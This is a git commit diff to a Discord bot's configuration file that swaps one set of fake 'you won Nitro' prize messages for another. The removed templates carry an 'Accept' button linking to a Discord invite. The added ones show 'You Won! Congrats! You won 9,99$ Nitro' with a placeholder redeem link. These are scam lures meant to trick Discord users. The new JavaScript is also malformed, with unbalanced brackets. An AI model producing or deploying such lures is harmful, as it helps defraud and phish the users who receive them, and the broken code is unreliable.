9f5f38da110832385774ee71430412970af8a7cc
Alien <166258154+quizalien@users.noreply.github.com>
2026-07-04 09:55:10 +0300

    Update Configuration.js

--- src/Structures/Configuration.js
+++ src/Structures/Configuration.js
@@ -14,46 +14,32 @@ module.exports = {
     icon: "https://polybit-apps.s3.amazonaws.com/stdlib/users/discord/profile/image.png",
 
     embed: [
-        {
-            "content": "{user} **you won a Nitro Boost** ! \nhttps://i.postimg.cc/kGgQVXgd/niporta-png.png",
-            "components": {
-                "type": 1,
-                "components": [
-                    {
-                        "type": 2,
-                        "label": "Accept",
-                        "style": 5,
-                        "emoji": {
-                            "name": "Discord",
-                            "id": "1243869797633232927",
-                            "animated": true
-                        },
-                        "url": "https://discord.gg/uDFzY9MdPp"
-                    }
-                ]
-            }
-        }
-    ],
+       {
+  "content": null,
+  "embeds": [
+    {
+      "title": "You Won!",
+      "description": "Congrats! You won **9,99$ Nitro** \n----------------------------------------\n[🎁 Reedeem](URL)",
+      "color": 14680319,
+      "image": {
+        "url": "https://media.discordapp.net/attachments/1373299797188018186/1373301022109466755/niporta.png?ex=6829e9be&is=6828983e&hm=5905bcd0bf15a0f6a8ebb6f0d91de4015d9f87e9a4a5c7a59f029c4cc41a16db&=&format=webp&quality=lossless&width=3587&height=987"
+      }
+    }
+  ],
+  "attachments": []
+}
 
-    embed2: [
-        {
-            "content": "{user} **you won a Nitro Boost** ! \nhttps://i.postimg.cc/kGgQVXgd/niporta-png.png",
-            "components": {
-                "type": 1,
-                "components": [
-                    {
-                        "type": 2,
-                        "label": "Accept",
-                        "style": 5,
-                        "emoji": {
-                            "name": "Discord",
-                            "id": "1243869797633232927",
-                            "animated": true
-                        },
-                        "url": "https://discord.gg/uDFzY9MdPp"
-                    }
-                ]
-            }
-        }
-    ]
+    embed2: [{
+  "content": null,
+  "embeds": [
+    {
+      "title": "You Won!",
+      "description": "Congrats! You won **9,99$ Nitro** \n----------------------------------------\n[🎁 Reedeem](URL)",
+      "color": 14680319,
+      "image": {
+        "url": "https://media.discordapp.net/attachments/1373299797188018186/1373301022109466755/niporta.png?ex=6829e9be&is=6828983e&hm=5905bcd0bf15a0f6a8ebb6f0d91de4015d9f87e9a4a5c7a59f029c4cc41a16db&=&format=webp&quality=lossless&width=3587&height=987"
+      }
+    }
+  ],
+  "attachments": []
 }
